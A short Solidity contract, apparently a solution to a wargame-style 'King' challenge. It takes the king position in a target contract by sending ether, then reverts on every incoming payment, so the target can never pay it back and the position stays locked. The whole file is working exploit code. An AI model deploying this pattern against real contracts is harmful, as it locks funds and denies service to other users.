// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract Kingmaker {
    constructor (address _king) payable {
        address(_king).call{value: msg.value}("");
    }

    receive() payable external {
        revert("I am the king now");
    }
}
